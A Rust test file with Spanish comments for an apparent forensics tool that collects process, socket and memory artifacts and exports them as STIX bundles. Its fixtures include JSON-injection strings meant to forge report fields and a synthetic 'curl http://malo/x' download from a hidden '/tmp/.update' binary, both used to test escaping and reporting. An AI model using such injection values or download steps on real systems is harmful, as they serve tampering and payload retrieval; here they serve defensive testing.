//! Pruebas de la recogida automatica de incidentes y de la exportacion STIX.
//!
//! Lo que se recoge se recoge de un PROCESO DE VERDAD —el de la propia prueba y
//! los hijos que lanza—, con una conexion TCP real abierta para que haya socket
//! que encontrar. Lo que se exporta se valida con un analizador de JSON escrito
//! aqui: comprobar el documento buscando subcadenas no detectaria justo el fallo
//! que importa, que es un escapado roto por un nombre de fichero hostil.

use std::io::Write;
use std::net::{Ipv4Addr, TcpListener, TcpStream};
use std::path::PathBuf;

use aegis_forensics::artifacts::{
    IncidentArtifacts, MemoryArtifact, ProcessArtifact, SocketArtifact, SocketProto, Trigger,
};
use aegis_forensics::collect::{parse_addr, parse_proc_net, CollectConfig, Collector};
use aegis_forensics::json;
use aegis_forensics::stix;
use aegis_forensics::store;
use aegis_forensics::tiempo;
use aegis_scal::linux::process::ProcFsProcesses;

// ---------------------------------------------------------------------------
// Analizador de JSON minimo, para validar lo que se emite
// ---------------------------------------------------------------------------

/// Comprueba que el texto es un documento JSON bien formado.
///
/// Es deliberadamente estricto con las cadenas: es donde un nombre de fichero
/// con comillas rompe el documento, y es el fallo que estas pruebas buscan.
fn json_valido(s: &str) -> Result<(), String> {
    let b: Vec<char> = s.chars().collect();
    let mut i = 0usize;
    valor(&b, &mut i)?;
    saltar(&b, &mut i);
    if i != b.len() {
        return Err(format!("sobran {} caracteres al final", b.len() - i));
    }
    Ok(())
}

fn saltar(b: &[char], i: &mut usize) {
    while *i < b.len() && b[*i].is_whitespace() {
        *i += 1;
    }
}

fn valor(b: &[char], i: &mut usize) -> Result<(), String> {
    saltar(b, i);
    match b.get(*i) {
        Some('{') => objeto(b, i),
        Some('[') => arreglo(b, i),
        Some('"') => cadena(b, i),
        Some('t') => literal(b, i, "true"),
        Some('f') => literal(b, i, "false"),
        Some('n') => literal(b, i, "null"),
        Some(c) if *c == '-' || c.is_ascii_digit() => numero(b, i),
        Some(c) => Err(format!("caracter inesperado {c:?} en {i}")),
        None => Err("documento truncado".into()),
    }
}

fn literal(b: &[char], i: &mut usize, lit: &str) -> Result<(), String> {
    for c in lit.chars() {
        if b.get(*i) != Some(&c) {
            return Err(format!("se esperaba {lit} en {i}"));
        }
        *i += 1;
    }
    Ok(())
}

fn numero(b: &[char], i: &mut usize) -> Result<(), String> {
    let inicio = *i;
    if b.get(*i) == Some(&'-') {
        *i += 1;
    }
    while b.get(*i).is_some_and(|c| c.is_ascii_digit() || *c == '.') {
        *i += 1;
    }
    if *i == inicio {
        return Err(format!("numero vacio en {inicio}"));
    }
    Ok(())
}

fn cadena(b: &[char], i: &mut usize) -> Result<(), String> {
    if b.get(*i) != Some(&'"') {
        return Err(format!("se esperaba una cadena en {i}"));
    }
    *i += 1;
    while let Some(c) = b.get(*i) {
        match c {
            '"' => {
                *i += 1;
                return Ok(());
            }
            '\\' => {
                *i += 1;
                match b.get(*i) {
                    Some('u') => {
                        for k in 1..=4 {
                            if !b.get(*i + k).is_some_and(|c| c.is_ascii_hexdigit()) {
                                return Err(format!("escape \\u incompleto en {i}"));
                            }
                        }
                        *i += 5;
                    }
                    Some('"') | Some('\\') | Some('/') | Some('b') | Some('f') | Some('n')
                    | Some('r') | Some('t') => *i += 1,
                    otro => return Err(format!("escape invalido {otro:?} en {i}")),
                }
            }
            c if (*c as u32) < 0x20 => {
                return Err(format!("caracter de control sin escapar {:?} en {i}", *c))
            }
            _ => *i += 1,
        }
    }
    Err("cadena sin cerrar".into())
}

fn objeto(b: &[char], i: &mut usize) -> Result<(), String> {
    *i += 1; // '{'
    saltar(b, i);
    if b.get(*i) == Some(&'}') {
        *i += 1;
        return Ok(());
    }
    loop {
        saltar(b, i);
        cadena(b, i)?;
        saltar(b, i);
        if b.get(*i) != Some(&':') {
            return Err(format!("falta ':' en {i}"));
        }
        *i += 1;
        valor(b, i)?;
        saltar(b, i);
        match b.get(*i) {
            Some(',') => *i += 1,
            Some('}') => {
                *i += 1;
                return Ok(());
            }
            otro => return Err(format!("se esperaba ',' o '}}', llego {otro:?} en {i}")),
        }
    }
}

fn arreglo(b: &[char], i: &mut usize) -> Result<(), String> {
    *i += 1; // '['
    saltar(b, i);
    if b.get(*i) == Some(&']') {
        *i += 1;
        return Ok(());
    }
    loop {
        valor(b, i)?;
        saltar(b, i);
        match b.get(*i) {
            Some(',') => *i += 1,
            Some(']') => {
                *i += 1;
                return Ok(());
            }
            otro => return Err(format!("se esperaba ',' o ']', llego {otro:?} en {i}")),
        }
    }
}

// ---------------------------------------------------------------------------
// JSON
// ---------------------------------------------------------------------------

#[test]
fn el_escapado_aguanta_material_hostil() {
    // El nombre de un binario y su linea de comandos los elige el ATACANTE. Una
    // comilla sin escapar rompe el documento; peor, permite inyectar campos y
    // falsificar el propio informe forense.
    let hostil = "arma\"; \"type\":\"file\", \"x\":\"\\ maligno\nsegunda\tlinea\u{7}";
    let q = json::quote(hostil);
    let doc = format!("{{\"v\":{q}}}");
    json_valido(&doc).expect("el documento tiene que seguir siendo valido");
    assert!(q.contains("\\\""), "las comillas van escapadas");
    assert!(q.contains("\\\\"), "las contrabarras van escapadas");
    assert!(q.contains("\\n"), "los saltos de linea van escapados");
    assert!(q.contains("\\u0007"), "los controles van en \\u00XX");
}

#[test]
fn una_linea_de_comandos_que_no_es_utf8_no_rompe_el_informe() {
    // El kernel guarda los bytes que le dieron: no tienen por que ser UTF-8.
    let crudo = b"/tmp/\xff\xfe/carga\x00--flag";
    let s = json::from_bytes(crudo);
    json_valido(&format!("{{\"v\":{}}}", json::quote(&s))).unwrap();
}

// ---------------------------------------------------------------------------
// Tiempo
// ---------------------------------------------------------------------------

#[test]
fn las_marcas_de_tiempo_son_las_que_espera_stix() {
    assert_eq!(tiempo::rfc3339(0, 0), "1970-01-01T00:00:00.000Z");
    assert_eq!(tiempo::rfc3339(1, 500), "1970-01-01T00:00:01.500Z");
    assert_eq!(
        tiempo::rfc3339(1_700_000_000, 0),
        "2023-11-14T22:13:20.000Z"
    );
    // 29 de febrero de 2024: el caso que rompe una aritmetica de calendario mal
    // hecha.
    assert_eq!(
        tiempo::rfc3339(1_709_164_800, 0),
        "2024-02-29T00:00:00.000Z"
    );
    // Y el fin de siglo, donde 2000 SI es bisiesto y 1900 no lo era.
    assert_eq!(tiempo::rfc3339(951_782_400, 0), "2000-02-29T00:00:00.000Z");
    assert_eq!(tiempo::civil_desde_dias(0), (1970, 1, 1));

    let ahora = tiempo::ahora();
    assert_eq!(ahora.len(), 24, "{ahora}");
    assert!(ahora.ends_with('Z'));
}

// ---------------------------------------------------------------------------
// Identificadores
// ---------------------------------------------------------------------------

#[test]
fn sha1_da_los_vectores_conocidos() {
    // Vectores del FIPS 180-1. Si esta funcion se desviara, los identificadores
    // de los observables dejarian de coincidir con los del resto del mundo y la
    // deduplicacion entre plataformas se romperia en silencio.
    let hex = |b: [u8; 20]| b.iter().map(|x| format!("{x:02x}")).collect::<String>();
    assert_eq!(
        hex(stix::sha1(b"")),
        "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    );
    assert_eq!(
        hex(stix::sha1(b"abc")),
        "a9993e364706816aba3e25717850c26c9cd0d89d"
    );
    assert_eq!(
        hex(stix::sha1(
            b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"
        )),
        "84983e441c3bd26ebaae4aa1f95129e5e54670f1"
    );
    // Un mensaje de exactamente 64 bytes ejercita el bloque de relleno extra.
    assert_eq!(
        hex(stix::sha1(&[b'a'; 64])),
        "0098ba824b5c16427bd7a1122a5a442a25ec644d"
    );
}

#[test]
fn el_uuid_v5_coincide_con_la_referencia() {
    // Vector clasico: espacio de nombres DNS y el nombre "python.org".
    const NS_DNS: [u8; 16] = [
        0x6b, 0xa7, 0xb8, 0x10, 0x9d, 0xad, 0x11, 0xd1, 0x80, 0xb4, 0x00, 0xc0, 0x4f, 0xd4, 0x30,
        0xc8,
    ];
    assert_eq!(
        stix::uuid_v5(&NS_DNS, b"python.org"),
        "886313e1-3b8a-5372-9b90-0c9aee199e5d"
    );
    // Y con el espacio de nombres de STIX es estable entre ejecuciones, que es
    // lo que permite deduplicar sin comparar informes enteros.
    let a = stix::uuid_v5(&stix::NS_SCO, b"{\"name\":\"x\"}");
    let b = stix::uuid_v5(&stix::NS_SCO, b"{\"name\":\"x\"}");
    assert_eq!(a, b);
    assert_ne!(a, stix::uuid_v5(&stix::NS_SCO, b"{\"name\":\"y\"}"));
}

#[test]
fn el_uuid_v4_es_valido_y_no_se_repite() {
    let a = stix::uuid_v4();
    let b = stix::uuid_v4();
    assert_ne!(
        a, b,
        "dos identificadores aleatorios iguales serian un fallo"
    );
    assert_eq!(a.len(), 36);
    assert_eq!(&a[14..15], "4", "la version tiene que ser 4: {a}");
    assert!(
        matches!(&a[19..20], "8" | "9" | "a" | "b"),
        "variante RFC 4122: {a}"
    );
}

// ---------------------------------------------------------------------------
// procfs
// ---------------------------------------------------------------------------

#[test]
fn las_direcciones_de_procfs_se_leen_con_el_orden_correcto() {
    // La direccion viene en el orden de bytes del HOST y el PUERTO en el de
    // red. Mezclar los dos criterios da direcciones invertidas que no
    // corresponden a nada, y es el error clasico de este analizador.
    let a = parse_addr("0100007F:1F90", SocketProto::Tcp).unwrap();
    assert_eq!(a.ip().to_string(), "127.0.0.1");
    assert_eq!(a.port(), 8080);

    let b = parse_addr("0202000C:0016", SocketProto::Tcp).unwrap();
    assert_eq!(b.ip().to_string(), "12.0.2.2");
    assert_eq!(b.port(), 22);

    // IPv6: cuatro palabras de 32 bits, cada una en el orden del host.
    let c = parse_addr("00000000000000000000000001000000:0050", SocketProto::Tcp6).unwrap();
    assert_eq!(c.port(), 80);
    assert!(c.ip().is_ipv6());

    assert!(parse_addr("basura", SocketProto::Tcp).is_none());
    assert!(parse_addr("0100007F", SocketProto::Tcp).is_none());
}

#[test]
fn la_tabla_de_sockets_se_analiza_entera() {
    let tabla = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n\
                 \x20  0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12345 1 0000 100 0 0 10 0\n\
                 \x20  1: 0202000C:C350 0302000C:0016 01 00000000:00000000 00:00000000 00000000  1000        0 67890 1 0000 100 0 0 10 0\n";
    let v = parse_proc_net(tabla, SocketProto::Tcp);
    assert_eq!(v.len(), 2);
    assert_eq!(v[0].state, "LISTEN");
    assert_eq!(v[0].inode, 12345);
    assert!(
        !v[0].is_connected(),
        "un socket a la escucha no tiene extremo"
    );
    assert_eq!(v[1].state, "ESTABLISHED");
    assert_eq!(v[1].inode, 67890);
    assert_eq!(v[1].remote.port(), 22);
    assert!(v[1].is_connected());
}

// ---------------------------------------------------------------------------
// Recogida real
// ---------------------------------------------------------------------------

fn disparador() -> Trigger {
    Trigger {
        source: "conductual".into(),
        reason: "cadena web-rce con puntuacion 89".into(),
        score: Some(89),
        techniques: vec!["T1059".into(), "T1105".into()],
    }
}

#[test]
fn se_recoge_un_incidente_real_de_este_proceso() {
    // Un socket de verdad, para que haya algo que encontrar.
    let servidor = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).unwrap();
    let puerto = servidor.local_addr().unwrap().port();
    let _cliente = TcpStream::connect((Ipv4Addr::LOCALHOST, puerto)).unwrap();
    let _aceptado = servidor.accept().unwrap();

    // El binario de esta prueba lleva simbolos de depuracion y pasa de 180 MB;
    // el limite por defecto esta pensado para binarios de malware, que son
    // pequenos. Se sube para poder comprobar el hasheo de verdad, y el limite
    // por defecto se ejercita en `los_limites_de_la_recogida_se_respetan`.
    let c = Collector::new(
        ProcFsProcesses::new(),
        CollectConfig {
            max_hash_bytes: 1024 * 1024 * 1024,
            ..CollectConfig::default()
        },
    );
    let a = c.collect(std::process::id(), disparador());

    assert_eq!(a.root_pid, std::process::id());
    assert!(!a.processes.is_empty());
    let yo = &a.processes[0];
    assert_eq!(yo.pid, std::process::id());
    assert!(yo.image.is_some(), "el binario de la prueba existe");
    let hash = yo.sha256.as_ref().expect("y se puede hashear");
    assert_eq!(hash.len(), 64, "SHA-256 en hexadecimal");
    assert!(yo.image_size.unwrap() > 0);

    assert!(
        a.sockets
            .iter()
            .any(|s| s.local.port() == puerto || s.remote.port() == puerto),
        "el socket abierto tiene que aparecer: {:?}",
        a.sockets
    );
    assert!(a.memory.regions_total > 3, "un proceso real tiene regiones");
    assert!(!a.memory.findings.is_empty(), "el analisis deja constancia");
    assert!(!a.id.is_empty());
    assert!(!a.is_empty());
}

#[test]
fn el_hash_recogido_es_el_del_binario_de_verdad() {
    let c = Collector::new(
        ProcFsProcesses::new(),
        CollectConfig {
            max_hash_bytes: 1024 * 1024 * 1024,
            inspect_memory: false,
            ..CollectConfig::default()
        },
    );
    let a = c.collect(std::process::id(), disparador());
    let yo = &a.processes[0];

    let esperado =
        aegis_forensics::collect::sha256_fichero(&std::env::current_exe().unwrap()).unwrap();
    assert_eq!(
        yo.sha256.as_deref(),
        Some(esperado.as_str()),
        "el hash tiene que ser el del ejecutable, no el de otra cosa"
    );
}

#[test]
fn lo_que_no_se_pudo_recoger_queda_escrito() {
    // Un informe que calla sus huecos induce a concluir que algo no ocurrio
    // cuando lo unico cierto es que no se pudo mirar.
    let c = Collector::new(ProcFsProcesses::new(), CollectConfig::default());
    let a = c.collect(4_294_967_290, disparador());
    assert!(a.processes.is_empty());
    assert!(
        a.gaps.iter().any(|g| g.contains("no se pudo retratar")),
        "el hueco tiene que constar: {:?}",
        a.gaps
    );
}

#[test]
fn los_limites_de_la_recogida_se_respetan_y_se_anotan() {
    let c = Collector::new(
        ProcFsProcesses::new(),
        CollectConfig {
            max_processes: 1,
            max_depth: 4,
            max_sockets: 1,
            max_regions: 2,
            max_hash_bytes: 1,
            inspect_memory: false,
        },
    );
    let a = c.collect(std::process::id(), disparador());
    assert!(a.processes.len() <= 1);
    assert!(a.sockets.len() <= 1);
    // El binario de la prueba pasa de un byte: no se hashea, y se dice.
    assert!(a.processes[0].sha256.is_none());
    assert!(
        a.gaps.iter().any(|g| g.contains("limite de hasheo")),
        "{:?}",
        a.gaps
    );
    assert_eq!(a.memory.regions_total, 0, "no se pidio mirar la memoria");
}

// ---------------------------------------------------------------------------
// STIX
// ---------------------------------------------------------------------------

fn artefactos_sinteticos(cmdline: &str) -> IncidentArtifacts {
    let mut a = IncidentArtifacts {
        id: "abc123".into(),
        collected_at: "2024-05-17T09:31:04.123Z".into(),
        trigger: disparador(),
        root_pid: 100,
        processes: vec![
            ProcessArtifact {
                pid: 100,
                ppid: 1,
                start_stamp: 5000,
                image: Some(PathBuf::from("/tmp/.update")),
                cmdline: vec![cmdline.to_string()],
                uid: 33,
                sha256: Some("a".repeat(64)),
                image_size: Some(4096),
            },
            ProcessArtifact {
                pid: 101,
                ppid: 100,
                start_stamp: 5100,
                image: Some(PathBuf::from("/usr/bin/curl")),
                cmdline: vec!["curl".into(), "http://malo/x".into()],
                uid: 33,
                sha256: Some("b".repeat(64)),
                image_size: Some(200_000),
            },
        ],
        sockets: vec![
            SocketArtifact {
                pid: 101,
                proto: SocketProto::Tcp,
                local: "192.0.2.2:44321".parse().unwrap(),
                remote: "198.51.100.9:443".parse().unwrap(),
                state: "ESTABLISHED",
                inode: 42,
            },
            SocketArtifact {
                pid: 100,
                proto: SocketProto::Tcp,
                local: "0.0.0.0:8080".parse().unwrap(),
                remote: "0.0.0.0:0".parse().unwrap(),
                state: "LISTEN",
                inode: 43,
            },
        ],
        memory: MemoryArtifact {
            regions_total: 30,
            anonymous_exec: Vec::new(),
            bytes_read: 4096,
            findings: vec!["firma de shellcode en el desplazamiento 0x40".into()],
        },
        gaps: vec!["no se pudo hashear /tmp/borrado".into()],
    };
    a.memory.anonymous_exec.clear();
    a
}

/// Generador de UUID fijo, para poder comparar el documento entero.
fn uuids_fijos() -> impl FnMut() -> String {
    let mut n = 0u32;
    move || {
        n += 1;
        format!("00000000-0000-4000-8000-{n:012}")
    }
}

#[test]
fn el_bundle_es_json_valido_y_tiene_lo_que_debe() {
    let a = artefactos_sinteticos("/tmp/.update --stealth");
    let mut u = uuids_fijos();
    let b = stix::to_bundle_with(&a, &mut u);

    json_valido(&b).expect("el bundle tiene que ser JSON valido");
    assert!(b.starts_with("{\"type\":\"bundle\",\"id\":\"bundle--"));
    for esperado in [
        "\"type\":\"file\"",
        "\"type\":\"process\"",
        "\"type\":\"network-traffic\"",
        "\"type\":\"ipv4-addr\"",
        "\"type\":\"observed-data\"",
        "\"type\":\"indicator\"",
        "\"spec_version\":\"2.1\"",
        "[file:hashes.'SHA-256' = '",
        "mitre-attack",
        "T1059",
    ] {
        assert!(b.contains(esperado), "falta {esperado} en el bundle");
    }
    // La conexion establecida esta; el socket a la escucha no, porque no aporta
    // infraestructura con la que pivotar.
    assert!(b.contains("198.51.100.9"));
    assert!(!b.contains("\"value\":\"0.0.0.0\""));
    // Los huecos viajan en el documento.
    assert!(b.contains("x_aegis_gaps"));
    assert!(b.contains("x_aegis_memory_findings"));
    assert_eq!(a.connected_sockets().count(), 1);
}

#[test]
fn un_nombre_de_binario_hostil_no_falsifica_el_informe() {
    // El atacante controla el nombre y la linea de comandos. Sin escapado, esto
    // inyectaria campos en el documento.
    let a = artefactos_sinteticos("x\", \"type\": \"identity\", \"name\": \"suplantado");
    let mut u = uuids_fijos();
    let b = stix::to_bundle_with(&a, &mut u);
    json_valido(&b).expect("sigue siendo JSON valido");
    assert!(
        !b.contains("\"type\":\"identity\""),
        "no se pudo inyectar un objeto nuevo"
    );
}

#[test]
fn los_identificadores_de_observables_son_deterministas() {
    // Es lo que permite que dos agentes que vean el mismo binario produzcan el
    // mismo identificador y la consola pueda deduplicar.
    let a = artefactos_sinteticos("x");
    let mut u1 = uuids_fijos();
    let mut u2 = uuids_fijos();
    assert_eq!(
        stix::to_bundle_with(&a, &mut u1),
        stix::to_bundle_with(&a, &mut u2)
    );

    // Y dos procesos con el MISMO pid y distinto arranque son observables
    // distintos: un PID reciclado no puede heredar la identidad del anterior.
    let mut b = artefactos_sinteticos("x");
    b.processes[1].pid = 100;
    b.processes[1].start_stamp = 9999;
    let mut u3 = uuids_fijos();
    let doc = stix::to_bundle_with(&b, &mut u3);
    json_valido(&doc).unwrap();
    let procesos = doc.matches("\"type\":\"process\"").count();
    assert_eq!(procesos, 2, "dos objetos distintos pese al mismo PID");
}

#[test]
fn sin_hash_no_se_emite_un_indicador_vacio() {
    // Un indicador sin patron util es ruido en la plataforma de quien lo reciba.
    let mut a = artefactos_sinteticos("x");
    a.processes[0].sha256 = None;
    let mut u = uuids_fijos();
    let b = stix::to_bundle_with(&a, &mut u);
    json_valido(&b).unwrap();
    assert!(!b.contains("\"type\":\"indicator\""));
}

// ---------------------------------------------------------------------------
// Custodia
// ---------------------------------------------------------------------------

struct Lab(PathBuf);
impl Lab {
    fn nuevo(n: &str) -> Lab {
        let p = std::env::temp_dir().join(format!("aegis-inc-{n}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        Lab(p)
    }
}
impl Drop for Lab {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

#[test]
fn el_informe_se_guarda_cifrado_y_se_recupera_entero() {
    let lab = Lab::nuevo("store");
    let clave = [7u8; 32];
    let mut logger = aegis_audit::AuditLogger::open(
        &lab.0,
        "auditoria",
        clave,
        aegis_audit::AuditConfig::default(),
    )
    .unwrap();

    let a = artefactos_sinteticos("/tmp/.update --stealth");
    let bundle = stix::to_bundle(&a);
    let fila = store::store_bundle(&mut logger, &a, 1_000, bundle.clone()).unwrap();
    assert!(fila > 0);

    let filas = logger
        .query_active(aegis_audit::Severity::Critical)
        .unwrap();
    let ev = filas
        .iter()
        .find(|e| e.event.kind == store::KIND)
        .expect("el informe tiene que estar en el registro");
    assert_eq!(ev.event.detail, bundle, "y salir identico a como entro");
    assert_eq!(ev.event.actor, a.root_pid as u64);

    // Y en el fichero NO puede aparecer en claro: es lo mas sensible de la
    // maquina —rutas, lineas de comandos, con quien hablaba—.
    let mut crudo = Vec::new();
    for e in std::fs::read_dir(&lab.0).unwrap() {
        let p = e.unwrap().path();
        if p.is_file() {
            if let Ok(b) = std::fs::read(&p) {
                crudo.extend(b);
            }
        }
    }
    let texto = String::from_utf8_lossy(&crudo);
    assert!(
        !texto.contains("198.51.100.9"),
        "el destino remoto no puede estar en claro en el disco"
    );
    assert!(!texto.contains("/tmp/.update"));
}

#[test]
fn un_informe_enorme_se_recorta_y_se_dice_que_se_recorto() {
    // Guardarlo entero desplazaria del registro, por rotacion, a los eventos
    // anteriores, que son justo el contexto del incidente.
    let lab = Lab::nuevo("trunc");
    let mut logger = aegis_audit::AuditLogger::open(
        &lab.0,
        "auditoria",
        [9u8; 32],
        aegis_audit::AuditConfig::default(),
    )
    .unwrap();

    let a = artefactos_sinteticos("x");
    let enorme = format!("{{\"relleno\":\"{}\"}}", "A".repeat(store::MAX_BUNDLE + 10));
    store::store_bundle(&mut logger, &a, 2_000, enorme).unwrap();

    let filas = logger
        .query_active(aegis_audit::Severity::Critical)
        .unwrap();
    let ev = filas
        .iter()
        .find(|e| e.event.kind == store::KIND_TRUNCADO)
        .expect("tiene que quedar constancia de que se recorto");
    json_valido(&ev.event.detail).expect("el resumen sigue siendo JSON valido");
    assert!(ev.event.detail.contains("\"truncated\":true"));
    // Y el resumen conserva lo que permite seguir investigando.
    assert!(ev.event.detail.contains("198.51.100.9:443"));
    assert!(ev.event.detail.contains(&"a".repeat(64)));
    assert!(ev.event.detail.contains("T1059"));
}

#[test]
fn el_ciclo_completo_va_de_un_proceso_vivo_al_registro_cifrado() {
    // De extremo a extremo: proceso real, recogida real, STIX real y registro
    // cifrado real.
    let lab = Lab::nuevo("e2e");
    let mut logger = aegis_audit::AuditLogger::open(
        &lab.0,
        "auditoria",
        [3u8; 32],
        aegis_audit::AuditConfig::default(),
    )
    .unwrap();

    let mut hijo = std::process::Command::new("/bin/sh")
        .args(["-c", "sleep 30"])
        .spawn()
        .unwrap();

    let c = Collector::new(ProcFsProcesses::new(), CollectConfig::default());
    let a = c.collect(hijo.id(), disparador());
    let fila = store::store(&mut logger, &a, 3_000).unwrap();
    assert!(fila > 0);

    let filas = logger
        .query_active(aegis_audit::Severity::Critical)
        .unwrap();
    let ev = filas.last().unwrap();
    json_valido(&ev.event.detail).expect("lo guardado es STIX valido");
    assert!(ev.event.detail.contains("\"type\":\"bundle\""));
    assert!(ev.event.detail.contains(&format!("\"pid\":{}", hijo.id())));

    let _ = hijo.kill();
    let _ = hijo.wait();
    let _ = std::io::stdout().flush();
}
